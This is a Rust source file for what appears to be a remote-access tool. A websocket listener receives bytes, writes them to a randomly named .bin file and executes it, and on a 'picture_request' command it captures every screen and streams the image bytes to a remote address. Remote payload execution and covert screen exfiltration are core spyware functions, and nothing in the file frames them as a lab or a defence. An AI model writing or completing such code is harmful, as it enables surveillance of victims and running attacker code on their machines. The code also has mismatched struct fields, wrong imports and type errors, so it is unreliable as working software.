use rand::distr::Alphanumeric;
use rand::{rng, Rng};
use screenshots::{
    image::{self, EncodableLayout},
    Screen,
};
use std::io::{self, env, process::Command, Write};
use std::{fs::File, net::TcpListener, thread::spawn};
use tungstenite::handshake::client::Response;
use tungstenite::{connect, Message};

pub struct Connector<'a> {
    socket_addr_client: &'a str,
    socket_addr_server: &'a str,
}
impl<'a> Connector<'a> {
    pub fn new(address: &'a str) -> Self {
        Connector {
            socket_addr: address,
        }
    }
    fn debug(response: Response) {
        println!("Connected to the server");
        println!("Response HTTP code: {}", response.status());
        println!("Response contains the following headers:");
        for (header, _value) in response.headers() {
            println!("* {header}");
        }
    }
    pub fn send_data(&self, data: &str) {
        let (mut socket, response) = connect(self.socket_addr).expect("Can't connect");
        //debug;
        // Self::debug(response);
        socket.send(Message::Text(data.into())).unwrap();
        let _ = socket.close(None);
    }

    // pub fn receive_data(&self) -> &str {}
    pub fn subscribe_for_updates(&self) {
        let server = TcpListener::bind("127.0.0.1:3012").unwrap();

        for stream in server.incoming() {
            let socket_addr = self.socket_addr.to_string();
            spawn(move || {
                use tungstenite::accept;

                let mut websocket = accept(stream.unwrap()).unwrap();
                let mut writing = false;
                let mut buffer: Vec<u8> = Vec::new();
                loop {
                    let msg = websocket.read().unwrap();
                    if writing {
                        recieve_file(msg.clone(), &mut buffer);
                    }
                    match msg.to_string().as_str() {
                        "file_transfer_start" => writing = true,
                        "picture_request" => make_screenshot(&socket_addr),
                        _ => println!("{}", msg),
                    }
                }
            });
        }
    }
}
fn recieve_file(message: Message, buffer: &mut Vec<u8>) {
    if message != "file_transfer_stop".into() {
        match u8::from_str_radix(&message.to_string(), 2) {
            Ok(number) => {
                buffer.push(number);
            }
            Err(e) => {
                println!("Failed to parse the binary string: {}", e);
            }
        }
    } else {
        let mut exe_dir = env::current_dir().expect("Failed to get executable directory");
        exe_dir.as_mut_os_string().push(get_random_filename());
        let mut file = File::create(exe_dir).expect("Failed to create file in specified location");

        file.write_all(buffer)
            .expect("Failed to write bytes to file");

        let output = Command::new(file)
            .output() // Execute the command and capture the output
            .expect("Failed to execute the file");
    }
}
fn get_random_filename() -> String {
    let mut s: String = rng()
        .sample_iter(&Alphanumeric)
        .take(7)
        .map(char::from)
        .collect();
    s.push_str(".bin");
    s
}
fn make_screenshot(socket_adr: &str) {
    let screens = Screen::all().unwrap();
    let connector = Connector::new(socket_adr);
    for screen in screens {
        let image = screen.capture().unwrap();
        image
            .save(format!("target/{}.png", screen.display_info.id))
            .unwrap();

        for byte in image.as_bytes() {
            connector.send_data(format!("{}", byte).as_str());
        }
    }
}
